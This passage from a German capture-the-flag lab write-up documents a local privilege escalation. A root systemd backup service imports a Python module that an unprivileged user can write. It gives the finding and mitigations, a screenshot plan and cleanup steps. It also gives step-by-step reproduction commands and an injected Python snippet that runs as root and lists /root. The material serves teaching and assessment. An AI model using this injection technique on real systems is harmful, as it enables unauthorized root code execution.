* ``/opt/vantis/lib/backup_helpers.py``

**Ursache:**

Der privilegierte Backup-Service importiert das Modul
``backup_helpers.py`` aus ``/opt/vantis/lib``.

Die importierte Datei gehört zwar ``root:root``, ist jedoch aufgrund der
effektiven Datei-/ACL-Berechtigungen für ``malik.da-costa`` schreibbar.

**Exploit-Voraussetzung:**

Ein authentifizierter lokaler Zugriff als ``malik.da-costa``.

**Technische Auswirkung:**

Ein Benutzer mit den Rechten von ``malik.da-costa`` kann beliebigen
Python-Code in das importierte Modul einbringen. Dieser Code wird beim
nächsten Backup-Lauf vom privilegierten Systemdienst ausgeführt.

**Nachgewiesene Auswirkung:**

.. code-block:: text

   malik.da-costa
        |
        v
   schreibt backup_helpers.py
        |
        v
   vantis-backup.timer
        |
        v
   vantis-backup.service
        |
        v
   Python importiert manipuliertes Modul
        |
        v
   EUID=0
        |
        v
   Zugriff auf /root/root.txt
        |
        v
   Flag 2

**Schweregrad:**

``High`` bis ``Critical`` abhängig von der im Modul vorgegebenen
Bewertungsmethodik.

Technisch wurde vollständige lokale Root-Codeausführung nachgewiesen.
Für den finalen Report sollte der Schweregrad konsistent mit dem
vorgegebenen Bewertungsraster begründet werden.

**Empfohlene Gegenmassnahmen:**

* ``backup_helpers.py`` darf nicht durch nicht privilegierte Benutzer
  schreibbar sein.
* ACLs auf ``/opt/vantis/lib`` und den enthaltenen Dateien überprüfen.
* Besitz und Berechtigungen auf mindestens einen restriktiven,
  administrativ kontrollierten Zustand setzen.
* Privilegierte Services sollen nur Code und Konfiguration aus
  vertrauenswürdigen, nicht durch unprivilegierte Benutzer veränderbaren
  Pfaden laden.
* Falls Root-Rechte für den Backup-Prozess nicht zwingend notwendig sind,
  sollte ein eigener, minimal privilegierter Service-Account verwendet
  werden.
* ``ProtectSystem=``, ``NoNewPrivileges=``, ``PrivateTmp=`` und weitere
  geeignete systemd-Hardening-Optionen prüfen.
* Änderungen an produktiv geladenen Python-Modulen überwachen.


========================================
Kapitel 9 – Evidence- und Screenshotplan
========================================

Für eine möglichst vollständige Nachvollziehbarkeit sollten mindestens
folgende Screenshots ergänzt werden:

1. ``[TODO: Screenshot – SSH-Kontext: id, hostname, pwd]``

2. ``[TODO: Screenshot – sudo-Fehlschlag als dokumentierter echter Fehlschlag]``

3. ``[TODO: Screenshot – gunicorn.ctl und Prozess läuft als malik.da-costa]``

4. ``[TODO: Screenshot – laufende Vantis-Services]``

5. ``[TODO: Screenshot – systemctl list-timers mit vantis-backup.timer]``

6. ``[TODO: Screenshot – systemctl cat vantis-backup.service]``

7. ``[TODO: Screenshot – /usr/local/sbin/vantis-backup.py mit Modulimport]``

8. ``[TODO: Screenshot – backup_helpers.py ist root:root, aber für Malik schreibbar]``

9. ``[TODO: Screenshot – /tmp/vantis-root-proof.txt mit EUID=0 und root.txt]``

10. ``[TODO: Screenshot – /tmp/flag2.txt mit Flag 2]``

11. ``[TODO: Screenshot – erfolgreiche Flag-2-Verifikation auf pentest.cyberlab.internal]``

.. note::

   Für die Bewertung sind insbesondere die Screenshots 8–11 wichtig, weil
   sie die Ursache, die kontrollierte Validation, die Zielerreichung und
   die Plattform-Verifikation zusammenhängend belegen.


====================
Kapitel 10 – Cleanup
====================

Sicherung vor der Änderung
--------------------------

Vor der Validation wurde die Originaldatei gesichert:

.. code-block:: bash

   cp /opt/vantis/lib/backup_helpers.py ~/backup_helpers.py.bak


Wiederherstellung
-----------------

Nach erfolgreicher Flag-2-Verifikation sollte die veränderte Library auf
den ursprünglichen Zustand zurückgesetzt werden:

.. code-block:: bash

   cp ~/backup_helpers.py.bak /opt/vantis/lib/backup_helpers.py

Anschliessend sollte kontrolliert werden, dass der eigene Validation-Code
nicht mehr enthalten ist:

.. code-block:: bash

   tail -n 40 /opt/vantis/lib/backup_helpers.py

Temporäre Proof-Dateien können nach abgeschlossener Evidence-Sicherung
entfernt werden:

.. code-block:: bash

   rm -f /tmp/vantis-root-proof.txt
   rm -f /tmp/flag2.txt

.. warning::

   ``[TODO: Cleanup tatsächlich durchführen und Screenshot/Nachweis ergänzen]``

   In der vorliegenden Chat-Historie wurde die Wiederherstellung empfohlen,
   aber nicht als tatsächlich ausgeführt bestätigt. Sie wird daher hier
   bewusst nicht fälschlich als abgeschlossen dargestellt.


=========================================
Kapitel 11 – Kompakte Reproduktion Flag 2
=========================================

Ausgangslage
------------

Voraussetzung:

* SSH-Zugang als ``malik.da-costa`` auf ``web01.vantis.internal``.


Reproduktionsschritte
---------------------

1. Timer identifizieren:

.. code-block:: bash

   systemctl list-timers --all --no-pager | grep -i vantis

2. Timer und Service analysieren:

.. code-block:: bash

   systemctl cat vantis-backup.timer
   systemctl cat vantis-backup.service

3. Startskript analysieren:

.. code-block:: bash

   ls -l /usr/local/sbin/vantis-backup.py
   sed -n '1,220p' /usr/local/sbin/vantis-backup.py

4. Importiertes Modul untersuchen:

.. code-block:: bash

   ls -l /opt/vantis/lib/backup_helpers.py
   test -w /opt/vantis/lib/backup_helpers.py && echo WRITABLE
   sed -n '1,220p' /opt/vantis/lib/backup_helpers.py

5. Original sichern:

.. code-block:: bash

   cp /opt/vantis/lib/backup_helpers.py ~/backup_helpers.py.bak

6. Minimalen Root-Nachweis einfügen:

.. code-block:: python

   try:
       with open("/tmp/vantis-root-proof.txt", "w") as f:
           f.write("EUID=" + str(os.geteuid()) + "\n")
           f.write("ROOT DIRECTORY:\n")
           for entry in os.listdir("/root"):
               f.write(entry + "\n")
       os.chmod("/tmp/vantis-root-proof.txt", 0o644)
   except Exception:
       pass

7. Regulären Timer-Lauf abwarten:

.. code-block:: bash

   while [ ! -f /tmp/vantis-root-proof.txt ]; do
       sleep 5
   done

   cat /tmp/vantis-root-proof.txt

8. Root-Kontext bestätigen:

.. code-block:: text

   EUID=0
   ROOT DIRECTORY:
   ...
   root.txt
   ...

9. Gezielt ``/root/root.txt`` über den bereits bestätigten Pfad lesen und
   nach ``/tmp/flag2.txt`` schreiben.

10. Flag auslesen:

.. code-block:: bash

   cat /tmp/flag2.txt

11. Flag auf ``pentest.cyberlab.internal`` verifizieren.

12. Originaldatei wiederherstellen und temporäre Dateien entfernen.

.. figure:: ../../_static/img/sem4/flag2/cys_flag2_final.PNG
       :alt: Erfolgreiche Einreichung und Validierung von Flag 2 auf der CYS II Lab Plattform
       :align: center
       :width: 100%

=======================
Kapitel 12 – Kurzfazit
=======================

Flag 2 wurde nicht durch eine einfache Dateisuche erreicht, sondern durch
eine methodische lokale Privilege-Escalation-Analyse nach dem vorhandenen
Foothold.

Die zentrale Schwachstelle war eine fehlerhafte Trust-Beziehung zwischen
einem privilegierten periodischen ``systemd``-Service und einem von
``malik.da-costa`` veränderbaren Python-Modul.

Der entscheidende Zusammenhang war:

.. code-block:: text

   schreibbares Python-Modul
       +
   Root-systemd-Service
       +
   periodischer Modulimport
       =
   kontrollierbare Root-Codeausführung

Die kontrollierte Validation mit ``EUID=0`` bestätigte den
Privilege-Escalation-Pfad eindeutig. Anschliessend konnte mit minimalem
zusätzlichem Zugriff gezielt ``/root/root.txt`` gelesen und damit Flag 2
erreicht werden.

Der Analysepfad enthält sowohl erfolgreiche Schritte als auch echte
Fehlschläge und dokumentiert jeweils:

**Beobachtung -> Hypothese -> Überprüfung -> Erkenntnis -> nächster Schritt**

Damit ist der technische Weg von Flag 1 über den lokalen
``malik.da-costa``-Kontext bis zur Root-Ausführung und zu Flag 2
vollständig nachvollziehbar.
